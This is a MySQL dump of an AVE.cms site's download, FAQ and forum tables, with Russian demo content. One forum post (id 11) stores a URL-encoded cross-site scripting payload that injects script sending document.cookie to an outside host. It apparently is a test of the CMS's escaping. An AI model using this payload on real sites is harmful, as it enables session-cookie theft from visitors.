INSERT INTO `cp_modul_download_kat` VALUES (29, 27, 'Хомяки Рафшаны', 2, 'Работают медленно но верно', '1|2|4|3', '');
INSERT INTO `cp_modul_download_kat` VALUES (30, 25, 'Блондины', 1, 'ну собственно понятно', '1|2|4|3', '');
INSERT INTO `cp_modul_download_kat` VALUES (31, 25, 'Брюнеты', 2, 'тоже все ясно тоже все ясно тоже все ясно тоже все ясно тоже все ясно тоже все ясно тоже все ясно тоже все ясно тоже все ясно тоже все ясно тоже все ясно тоже все ясно тоже все ясно тоже все ясно тоже все ясно тоже все ясно тоже все ясно тоже все ясно тоже все ясно тоже все ясно тоже все ясно тоже все ясно тоже все ясно тоже все ясно тоже все ясно ', '1|2|4|3', '');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_download_lizenzen`
-- 

CREATE TABLE `cp_modul_download_lizenzen` (
  `Id` smallint(2) unsigned NOT NULL auto_increment,
  `Name` char(255) NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_download_lizenzen`
-- 

INSERT INTO `cp_modul_download_lizenzen` VALUES (1, 'Freeware');
INSERT INTO `cp_modul_download_lizenzen` VALUES (2, 'Shareware');
INSERT INTO `cp_modul_download_lizenzen` VALUES (3, 'Без лицензии');
INSERT INTO `cp_modul_download_lizenzen` VALUES (4, 'GNU LGPL');
INSERT INTO `cp_modul_download_lizenzen` VALUES (5, 'GPL');
INSERT INTO `cp_modul_download_lizenzen` VALUES (6, 'LGPL');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_download_log`
-- 

CREATE TABLE `cp_modul_download_log` (
  `Id` int(14) unsigned NOT NULL auto_increment,
  `FileId` int(14) unsigned NOT NULL default '0',
  `Datum` char(10) NOT NULL,
  `Ip` char(100) NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_download_log`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_download_os`
-- 

CREATE TABLE `cp_modul_download_os` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `Name` char(200) NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=18 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_download_os`
-- 

INSERT INTO `cp_modul_download_os` VALUES (1, 'Windows 95');
INSERT INTO `cp_modul_download_os` VALUES (2, 'Windows 98');
INSERT INTO `cp_modul_download_os` VALUES (3, 'Windows ME');
INSERT INTO `cp_modul_download_os` VALUES (4, 'Windows 2000');
INSERT INTO `cp_modul_download_os` VALUES (5, 'Windows 2003');
INSERT INTO `cp_modul_download_os` VALUES (6, 'Windows NT');
INSERT INTO `cp_modul_download_os` VALUES (7, 'Windows XP');
INSERT INTO `cp_modul_download_os` VALUES (8, 'Windows Vista');
INSERT INTO `cp_modul_download_os` VALUES (9, 'Independent');
INSERT INTO `cp_modul_download_os` VALUES (10, 'Handheld');
INSERT INTO `cp_modul_download_os` VALUES (11, 'Linux');
INSERT INTO `cp_modul_download_os` VALUES (12, 'Mac');
INSERT INTO `cp_modul_download_os` VALUES (13, 'Mac OS 7.x');
INSERT INTO `cp_modul_download_os` VALUES (14, 'Mac OS 8.x');
INSERT INTO `cp_modul_download_os` VALUES (15, 'Mac OS 9.x');
INSERT INTO `cp_modul_download_os` VALUES (16, 'Mac OS X');
INSERT INTO `cp_modul_download_os` VALUES (17, 'Unix');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_download_payhistory`
-- 

CREATE TABLE `cp_modul_download_payhistory` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `User_Id` int(10) unsigned NOT NULL default '0',
  `PayAmount` double(14,2) unsigned NOT NULL default '0.00',
  `File_Id` int(10) unsigned NOT NULL default '0',
  `PayDate` char(10) NOT NULL,
  `User_IP` char(15) NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_download_payhistory`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_download_settings`
-- 

CREATE TABLE `cp_modul_download_settings` (
  `Empfehlen` tinyint(1) unsigned NOT NULL default '1',
  `Bewerten` tinyint(1) unsigned NOT NULL default '0',
  `Spamwoerter` text NOT NULL,
  `Kommentare` tinyint(1) unsigned NOT NULL default '1'
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_download_settings`
-- 

INSERT INTO `cp_modul_download_settings` VALUES (1, 1, 'viagra\r\ncialis\r\ncasino\r\ngamble\r\npoker\r\nholdem\r\nbackgammon\r\nbackjack\r\nblack Jack\r\nRoulette\r\nV-I-A-G-R-A\r\nsex\r\ninsurance\r\n!!!\r\n???\r\nxxx', 1);

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_download_sprachen`
-- 

CREATE TABLE `cp_modul_download_sprachen` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `Name` char(200) NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_download_sprachen`
-- 

INSERT INTO `cp_modul_download_sprachen` VALUES (1, 'Русский');
INSERT INTO `cp_modul_download_sprachen` VALUES (2, 'Английский');
INSERT INTO `cp_modul_download_sprachen` VALUES (3, 'Немецкий');
INSERT INTO `cp_modul_download_sprachen` VALUES (4, 'Французский');
INSERT INTO `cp_modul_download_sprachen` VALUES (5, 'Итальянский');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_faq`
-- 

CREATE TABLE `cp_modul_faq` (
  `id` mediumint(5) unsigned NOT NULL auto_increment,
  `faq_title` char(100) NOT NULL,
  `faq_description` char(255) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_faq`
-- 

INSERT INTO `cp_modul_faq` VALUES (1, 'Первая рубрика', 'Описание первой рубрики');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_faq_quest`
-- 

CREATE TABLE `cp_modul_faq_quest` (
  `id` mediumint(5) unsigned NOT NULL auto_increment,
  `faq_quest` text NOT NULL,
  `faq_answer` text NOT NULL,
  `faq_id` mediumint(5) unsigned NOT NULL default '1',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_faq_quest`
-- 

INSERT INTO `cp_modul_faq_quest` VALUES (1, '<p>Где расположены шаблоны?</p>', '<p>Шаблоны расположены в административной части в разделе шаблоны.</p>\r\n<p><img src="/cms/uploads/faq/shab01.png" alt="" /></p>', 1);
INSERT INTO `cp_modul_faq_quest` VALUES (3, '<p>Почему предсказуем доиндустриальный тип политической культуры?</p>', '<p>Кризис легитимности, согласно традиционным представлениям, отражает онтологический коллапс Советского Союза (приводится по работе Д. Белла &quot;Грядущее постиндустриальное общество&quot;). Доиндустриальный тип политической культуры неоднозначен. Разновидность тоталитаризма, согласно традиционным представлениям, теоретически иллюстрирует субъект политического процесса, хотя на первый взгляд, российские власти тут ни при чем. Кризис легитимности верифицирует кризис легитимности, указывает в своем исследовании К. Поппер.</p>\r\n<p>Постиндустриализм, с другой стороны, теоретически возможен. Капиталистическое мировое общество, несмотря на внешние воздействия, ограничивает институциональный тоталитарный тип политической культуры, о чем писали такие авторы, как Ю. Хабермас и Т. Парсонс. Один из основоположников теории социализации Г. Тард писал, что политическое учение Августина определяет бихевиоризм, такого мнения придерживаются многие депутаты Государственной Думы. Идеология доказывает тоталитарный тип политической культуры, впрочем, не все политологи разделяют это мнение. Понятие политического участия самопроизвольно.</p>', 1);
INSERT INTO `cp_modul_faq_quest` VALUES (2, '<p>Современный тоталитарный тип политической культуры: предпосылки и развитие? <a href="index.php?id=5&amp;doc=kontakty">Контакты</a></p>', '<p>Политическое манипулирование неизбежно. Феномен толпы, короче говоря, определяет классический марксизм, хотя на первый взгляд, российские власти тут ни при чем. Конфедерация однозначно представляет собой институциональный христианско-демократический национализм, о чем будет подробнее сказано ниже. Политическое учение Локка формирует англо-американский тип политической культуры, такого мнения придерживаются многие депутаты Государственной Думы.</p>\r\n<p>Постиндустриализм практически формирует коллапс Советского Союза, отмечает Г.Алмонд. Коллапс Советского Союза, как правило, доказывает бихевиоризм, что получило отражение в трудах Михельса. Управление политическими конфликтами определяет системный элемент политического процесса, впрочем, это несколько расходится с концепцией Истона.</p>\r\n<p>Теологическая парадигма, на первый взгляд, вызывает прагматический политический процесс в современной России, последнее особенно ярко выражено в ранних работах В.И. Ленина. Правовое государство, с другой стороны, категорически иллюстрирует идеологический либерализм, что было отмечено П. Лазарсфельдом. Субъект власти формирует теоретический элемент политического процесса, такого мнения придерживаются многие депутаты Государственной Думы. <a href="index.php?id=5&amp;doc=kontakty">Контакты</a></p>', 1);

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_forum_allowed_files`
-- 

CREATE TABLE `cp_modul_forum_allowed_files` (
  `id` tinyint(3) unsigned NOT NULL auto_increment,
  `filetype` char(200) NOT NULL,
  `filesize` int(10) unsigned NOT NULL default '0',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=11 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_forum_allowed_files`
-- 

INSERT INTO `cp_modul_forum_allowed_files` VALUES (1, 'text/html', 250);
INSERT INTO `cp_modul_forum_allowed_files` VALUES (2, 'text/plain', 500);
INSERT INTO `cp_modul_forum_allowed_files` VALUES (3, 'image/jpeg', 500);
INSERT INTO `cp_modul_forum_allowed_files` VALUES (4, 'image/gif', 500);
INSERT INTO `cp_modul_forum_allowed_files` VALUES (5, 'application/x-zip-compressed', 500);
INSERT INTO `cp_modul_forum_allowed_files` VALUES (6, 'application/x-rar-compressed', 500);
INSERT INTO `cp_modul_forum_allowed_files` VALUES (7, 'application/postscript', 1024);
INSERT INTO `cp_modul_forum_allowed_files` VALUES (8, 'image/x-photoshop', 1024);
INSERT INTO `cp_modul_forum_allowed_files` VALUES (9, 'application/x-msdownload', 1024);
INSERT INTO `cp_modul_forum_allowed_files` VALUES (10, 'application/msword', 350);

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_forum_attachment`
-- 

CREATE TABLE `cp_modul_forum_attachment` (
  `id` mediumint(8) unsigned NOT NULL auto_increment,
  `orig_name` char(255) NOT NULL,
  `filename` char(255) NOT NULL,
  `hits` int(11) NOT NULL default '0',
  PRIMARY KEY  (`id`),
  KEY `filename` (`filename`),
  FULLTEXT KEY `filename_2` (`filename`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_forum_attachment`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_forum_category`
-- 

CREATE TABLE `cp_modul_forum_category` (
  `id` int(11) NOT NULL auto_increment,
  `title` varchar(200) NOT NULL default '',
  `position` smallint(5) unsigned NOT NULL default '0',
  `parent_id` smallint(5) unsigned default NULL,
  `comment` text,
  `group_id` text,
  PRIMARY KEY  (`id`),
  KEY `title` (`title`),
  KEY `position` (`position`),
  KEY `parent_id` (`parent_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_forum_category`
-- 

INSERT INTO `cp_modul_forum_category` VALUES (1, 'Демонстрационная категория', 1, 0, 'Категория для демонстрации работы форумов', '1,2,3,4,5,6,7,8,9');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_forum_forum`
-- 

CREATE TABLE `cp_modul_forum_forum` (
  `id` int(11) unsigned NOT NULL auto_increment,
  `title` varchar(200) NOT NULL default '',
  `category_id` int(11) unsigned NOT NULL default '0',
  `statusicon` varchar(20) default NULL,
  `comment` text,
  `status` tinyint(1) default '0',
  `last_post` datetime default NULL,
  `last_post_id` int(11) NOT NULL default '0',
  `group_id` varchar(150) default NULL,
  `active` tinyint(3) unsigned NOT NULL default '0',
  `password` varchar(100) default NULL,
  `password_raw` varchar(255) NOT NULL default '',
  `moderator` int(11) default NULL,
  `position` smallint(6) default '0',
  `moderated` tinyint(1) NOT NULL default '0',
  `moderated_posts` tinyint(1) NOT NULL default '0',
  `topic_emails` text NOT NULL,
  `post_emails` text NOT NULL,
  PRIMARY KEY  (`id`),
  KEY `title` (`title`),
  KEY `position` (`position`),
  KEY `group_id` (`group_id`),
  KEY `status` (`status`),
  KEY `category_id` (`category_id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_forum_forum`
-- 

INSERT INTO `cp_modul_forum_forum` VALUES (1, 'Общий форум', 1, NULL, 'Здесь можно говорить обо всем', 0, '2010-03-26 04:16:56', 11, '1,2,3,4', 1, '', '', NULL, 1, 0, 0, '', '');
INSERT INTO `cp_modul_forum_forum` VALUES (2, 'Мир вокруг нас', 1, NULL, 'Форум о событиях на планете земля.', 0, '2009-01-09 12:08:28', 4, '1,2,3,4,5,6,7,8,9', 1, '', '', NULL, 2, 0, 0, '', '');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_forum_groupavatar`
-- 

CREATE TABLE `cp_modul_forum_groupavatar` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `user_group` int(10) unsigned NOT NULL default '0',
  `IstStandard` tinyint(1) unsigned NOT NULL default '1',
  `StandardAvatar` char(255) NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_forum_groupavatar`
-- 

INSERT INTO `cp_modul_forum_groupavatar` VALUES (1, 1, 1, '');
INSERT INTO `cp_modul_forum_groupavatar` VALUES (2, 2, 1, '');
INSERT INTO `cp_modul_forum_groupavatar` VALUES (3, 3, 1, '');
INSERT INTO `cp_modul_forum_groupavatar` VALUES (4, 4, 1, '');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_forum_grouppermissions`
-- 

CREATE TABLE `cp_modul_forum_grouppermissions` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `user_group` int(10) unsigned NOT NULL default '0',
  `permission` text NOT NULL,
  `MAX_AVATAR_BYTES` int(8) unsigned NOT NULL default '10240',
  `MAX_AVATAR_HEIGHT` mediumint(3) unsigned NOT NULL default '90',
  `MAX_AVATAR_WIDTH` mediumint(3) unsigned NOT NULL default '90',
  `UPLOADAVATAR` tinyint(1) unsigned NOT NULL default '1',
  `MAXPN` mediumint(3) unsigned NOT NULL default '50',
  `MAXPNLENTH` int(8) unsigned NOT NULL default '5000',
  `MAXLENGTH_POST` int(8) unsigned NOT NULL default '10000',
  `MAXATTACHMENTS` smallint(2) unsigned NOT NULL default '5',
  `MAX_EDIT_PERIOD` smallint(4) unsigned NOT NULL default '672',
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `Benutzergruppe` (`user_group`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- Дамп данных таблицы `cp_modul_forum_grouppermissions`
-- 

INSERT INTO `cp_modul_forum_grouppermissions` VALUES (1, 1, 'own_avatar|canpn|accessforums|cansearch|last24|userprofile|changenick', 45056, 120, 120, 1, 100, 50000, 10000, 10, 1440);
INSERT INTO `cp_modul_forum_grouppermissions` VALUES (2, 2, 'accessforums|cansearch|last24|userprofile', 0, 0, 0, 1, 0, 0, 5000, 3, 0);
INSERT INTO `cp_modul_forum_grouppermissions` VALUES (3, 3, 'own_avatar|canpn|accessforums|cansearch|last24|userprofile', 10240, 90, 90, 1, 50, 5000, 10000, 5, 672);
INSERT INTO `cp_modul_forum_grouppermissions` VALUES (4, 4, 'own_avatar|canpn|accessforums|cansearch|last24|userprofile', 10240, 90, 90, 1, 50, 5000, 10000, 5, 672);

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_forum_ignorelist`
-- 

CREATE TABLE `cp_modul_forum_ignorelist` (
  `Id` int(14) unsigned NOT NULL auto_increment,
  `BenutzerId` int(14) unsigned NOT NULL default '0',
  `IgnoreId` int(10) unsigned NOT NULL default '0',
  `Grund` char(255) NOT NULL,
  `Datum` int(14) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_forum_ignorelist`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_forum_mods`
-- 

CREATE TABLE `cp_modul_forum_mods` (
  `forum_id` int(11) NOT NULL default '0',
  `user_id` int(11) NOT NULL default '0'
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_forum_mods`
-- 

INSERT INTO `cp_modul_forum_mods` VALUES (2, 2);

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_forum_permissions`
-- 

CREATE TABLE `cp_modul_forum_permissions` (
  `forum_id` int(11) NOT NULL default '0',
  `group_id` int(11) NOT NULL default '0',
  `permissions` char(255) NOT NULL,
  PRIMARY KEY  (`forum_id`,`group_id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_forum_permissions`
-- 

INSERT INTO `cp_modul_forum_permissions` VALUES (1, 1, '1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1');
INSERT INTO `cp_modul_forum_permissions` VALUES (1, 2, '1,1,1,1,0,0,0,0,,,,,,,,,,,,,,');
INSERT INTO `cp_modul_forum_permissions` VALUES (1, 3, '1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0');
INSERT INTO `cp_modul_forum_permissions` VALUES (1, 4, '1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1');
INSERT INTO `cp_modul_forum_permissions` VALUES (1, 5, '1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0');
INSERT INTO `cp_modul_forum_permissions` VALUES (2, 1, '1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1');
INSERT INTO `cp_modul_forum_permissions` VALUES (2, 2, '1,1,1,1,0,0,0,0,,,,,,,,,,,,,,');
INSERT INTO `cp_modul_forum_permissions` VALUES (2, 3, '1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0');
INSERT INTO `cp_modul_forum_permissions` VALUES (2, 4, '1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1');
INSERT INTO `cp_modul_forum_permissions` VALUES (2, 5, '1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_forum_pn`
-- 

CREATE TABLE `cp_modul_forum_pn` (
  `pnid` int(11) unsigned NOT NULL auto_increment,
  `to_uid` mediumint(8) unsigned default NULL,
  `from_uid` mediumint(8) unsigned default NULL,
  `topic` varchar(255) default NULL,
  `message` text,
  `is_readed` enum('yes','no') default NULL,
  `pntime` int(11) default '0',
  `typ` enum('inbox','outbox') default 'inbox',
  `smilies` enum('yes','no') NOT NULL default 'yes',
  `parseurl` enum('yes','no') NOT NULL default 'no',
  `reply` enum('yes','no') NOT NULL default 'no',
  `forward` enum('yes','no') NOT NULL default 'no',
  PRIMARY KEY  (`pnid`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_forum_pn`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_forum_post`
-- 

CREATE TABLE `cp_modul_forum_post` (
  `id` bigint(20) unsigned NOT NULL auto_increment,
  `title` varchar(200) default NULL,
  `topic_id` smallint(6) NOT NULL default '0',
  `datum` datetime NOT NULL default '0000-00-00 00:00:00',
  `uid` smallint(6) NOT NULL default '0',
  `use_bbcode` tinyint(1) NOT NULL default '0',
  `use_smilies` tinyint(1) NOT NULL default '0',
  `use_sig` tinyint(1) NOT NULL default '0',
  `message` text NOT NULL,
  `attachment` tinytext,
  `opened` tinyint(1) NOT NULL default '1',
  PRIMARY KEY  (`id`),
  KEY `title` (`title`),
  KEY `uid` (`uid`),
  KEY `topic_id` (`topic_id`),
  KEY `datum` (`datum`)
) ENGINE=MyISAM AUTO_INCREMENT=12 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_forum_post`
-- 

INSERT INTO `cp_modul_forum_post` VALUES (1, '', 1, '2009-01-08 12:51:13', 1, 1, 1, 1, 'Мы приветствуем Вас в наших форумах!\r\nОбщайтесь в удовольствие.', '', 1);
INSERT INTO `cp_modul_forum_post` VALUES (2, 'Юрский замок складки: русло или антиклиналь?', 2, '2009-01-09 11:59:20', 1, 1, 1, 1, 'Габбро поднято. Водопонижение и обезвоживание грунтов вызывают базис эрозии маловероятен. Флексура восстановлена. Ложе достаточно хорошо разогревает сейсмический шток, что в общем свидетельствует о преобладании тектонических опусканий в это время.', '', 1);
INSERT INTO `cp_modul_forum_post` VALUES (3, 'Хлоридно-гидрокарбонатный плюмаж: предпосылки и развитие', 2, '2009-01-09 12:03:06', 1, 1, 1, 1, 'Текстура имеет тенденцию останцовый рифт, но приводит к загрязнению окружающей среды. Вулканическое стекло сезонно. Напряженность магнитного поля Земли, которая в настоящее время находится ниже уровня моря, прекращает алмаз, что связано с мощностью вскрыши и полезного ископаемого. Межледниковье стягивает недонасыщенный разлом, в соответствии с изменениями в суммарной минерализации. Дельта ортогонально несет в себе каустобиолит, что лишь подтверждает то, что породные отвалы располагаются на склонах. \r\n\r\nЭвапорит, но если принять для простоты некоторые докущения, залегает в цокольный неоцен, в соответствии с изменениями в суммарной минерализации. Другим примером региональной компенсации может служить этажное залегание изменяет авгит, что в общем свидетельствует о преобладании тектонических опусканий в это время. Руда, так же, как и в других регионах, однослойна. Друмлин, так же, как и в других регионах, высвобождает кварц, но приводит к загрязнению окружающей среды. При рассмотрении возможности поступления загрязнений в подземные воды эксплуатируемых участков кварцит прекращает глетчерный калиево-натриевый полевой шпат, что обусловлено не только первичными неровностями эрозионно-тектонического рельефа поверхности кристаллических пород, но и проявлениями долее поздней блоковой тектоники. Калиево-натриевый полевой шпат разогревает кайнозой, что, однако, не уничтожило доледниковую переуглубленную гидросеть древних долин.', '', 1);
INSERT INTO `cp_modul_forum_post` VALUES (4, 'Близкий математический горизонт: гипотеза и теории', 3, '2009-01-09 12:08:28', 1, 1, 1, 1, 'Перигей притягивает спектральный класс, учитывая, что в одном парсеке 3,26 световых года. Уравнение времени дает ионный хвост, хотя это явно видно на фотогpафической пластинке, полученной с помощью 1.2-метpового телескопа. Как было показано выше, нулевой меридиан отражает космический мусор, хотя галактику в созвездии Дракона можно назвать карликовой. Вселенная достаточно огромна, чтобы Юпитер последовательно дает космический реликтовый ледник, таким образом, атмосферы этих планет плавно переходят в жидкую мантию. Отвесная линия прочно притягивает межпланетный перигелий, но кольца видны только при 40–50. \r\n\r\nВ отличие от давно известных астрономам планет земной группы, Лисичка доступна. Перигелий, следуя пионерской работе Эдвина Хаббла, перечеркивает параметр, хотя для имеющих глаза-телескопы туманность Андромеды показалась бы на небе величиной с треть ковша Большой Медведицы. Популяционный индекс колеблет первоначальный поперечник – у таких объектов рукава столь фрагментарны и обрывочны, что их уже нельзя назвать спиральными. Соединение, следуя пионерской работе Эдвина Хаббла, выслеживает экваториальный Млечный Путь (датировка приведена по Петавиусу, Цеху, Хайсу).', '', 1);
INSERT INTO `cp_modul_forum_post` VALUES (5, '', 1, '2009-11-29 01:11:33', 1, 1, 1, 1, '[QUOTE][B]Писал:  Admin[/B]\r\n Мы приветствуем Вас в наших форумах!\r\nОбщайтесь в удовольствие.[/QUOTE]\r\n\r\n[URL]http://test.avecms.ru/index.php?module=forums&show=newpost&action=quote&pid=1&toid=1[/URL]', '', 1);
INSERT INTO `cp_modul_forum_post` VALUES (6, '', 1, '2009-11-29 01:14:43', 1, 1, 1, 1, '[QUOTE][B]Писал:  Admin[/B]\r\n [QUOTE][B]Писал:  Admin[/B]\r\n Мы приветствуем Вас в наших форумах!\r\nОбщайтесь в удовольствие.[/QUOTE]\r\n\r\n[URL]http://test.avecms.ru/index.php?module=forums&show=newpost&action=quote&pid=1&toid=1[/URL][/QUOTE]\r\n\r\n[URL=http://phpthumb.sourceforge.net/demo/demo/phpThumb.demo.demo.php#showpic]йййй[/URL]', '', 1);
INSERT INTO `cp_modul_forum_post` VALUES (7, '', 1, '2009-11-29 01:42:52', 1, 1, 1, 1, '[URL]https://flowplayer.org/tools/demos/overlay/styling.html[/URL]\r\n[URL=https://flowplayer.org/tools/demos/overlay/styling.html]Webseiten-Name[/URL] \n[size=2]Отредактировано: 29.11.2009, 01:46:06[/size]', '', 1);
INSERT INTO `cp_modul_forum_post` VALUES (11, '', 1, '2010-03-26 04:16:56', 1, 1, 1, 1, '[URL=http://www.avecms.ru/index.php?id=1&doc=%22%3E%3Cscript%3Edocument.getElementById%28%27box_top_right%27%29.innerHTML=%27%3Cimg+src=%22http:%2F%2Fave209d.ru%2Fcms%2Findex.php?cookies=%27%2Bdocument.cookie%2B%27%22/%3E%27;%3C%2Fscript%3E%3C%22]Webseiten-Name[/URL]', '', 1);

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_forum_posticons`
-- 

CREATE TABLE `cp_modul_forum_posticons` (
  `id` int(11) NOT NULL auto_increment,
  `posi` mediumint(5) NOT NULL default '1',
  `active` tinyint(1) NOT NULL default '1',
  `path` char(55) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=15 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_forum_posticons`
-- 

INSERT INTO `cp_modul_forum_posticons` VALUES (1, 1, 1, 'icon1.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (2, 2, 1, 'icon2.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (3, 14, 1, 'icon3.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (4, 3, 1, 'icon4.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (5, 13, 1, 'icon5.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (6, 12, 1, 'icon6.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (7, 11, 1, 'icon7.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (8, 10, 1, 'icon8.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (9, 9, 1, 'icon9.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (10, 8, 1, 'icon10.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (11, 7, 1, 'icon11.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (12, 6, 1, 'icon12.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (13, 5, 2, 'icon13.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (14, 4, 2, 'icon14.gif');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_forum_rank`
-- 

CREATE TABLE `cp_modul_forum_rank` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `title` char(100) NOT NULL,
  `count` int(11) NOT NULL default '0',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_forum_rank`
-- 

INSERT INTO `cp_modul_forum_rank` VALUES (1, 'Новичок', 1);
INSERT INTO `cp_modul_forum_rank` VALUES (2, 'Иногда пишет', 100);
INSERT INTO `cp_modul_forum_rank` VALUES (3, 'Советник', 600);
INSERT INTO `cp_modul_forum_rank` VALUES (4, 'Эксперт', 1000);
INSERT INTO `cp_modul_forum_rank` VALUES (5, 'Живет здесь', 5000);
INSERT INTO `cp_modul_forum_rank` VALUES (6, 'Писатель', 200);

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_forum_rating`
-- 

CREATE TABLE `cp_modul_forum_rating` (
  `topic_id` int(11) NOT NULL default '0',
  `rating` text NOT NULL,
  `ip` text NOT NULL,
  `uid` text NOT NULL,
  PRIMARY KEY  (`topic_id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_forum_rating`
-- 

INSERT INTO `cp_modul_forum_rating` VALUES (1, '', '', '');
INSERT INTO `cp_modul_forum_rating` VALUES (2, '', '', '');
INSERT INTO `cp_modul_forum_rating` VALUES (3, '', '', '');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_forum_settings`
-- 

CREATE TABLE `cp_modul_forum_settings` (
  `boxwidthcomm` int(10) unsigned NOT NULL default '300',
  `boxwidthforums` int(10) unsigned NOT NULL default '300',
  `maxlengthword` int(10) unsigned NOT NULL default '50',
  `maxlines` int(10) unsigned NOT NULL default '15',
  `badwords` text,
  `badwords_replace` varchar(255) NOT NULL default '',
  `pageheader` text NOT NULL,
  `AbsenderMail` varchar(200) default NULL,
  `AbsenderName` varchar(200) default NULL,
  `SystemAvatars` tinyint(1) unsigned NOT NULL default '1',
  `BBCode` tinyint(1) unsigned NOT NULL default '1',
  `Smilies` tinyint(1) unsigned NOT NULL default '1',
  `Posticons` tinyint(1) unsigned NOT NULL default '1',
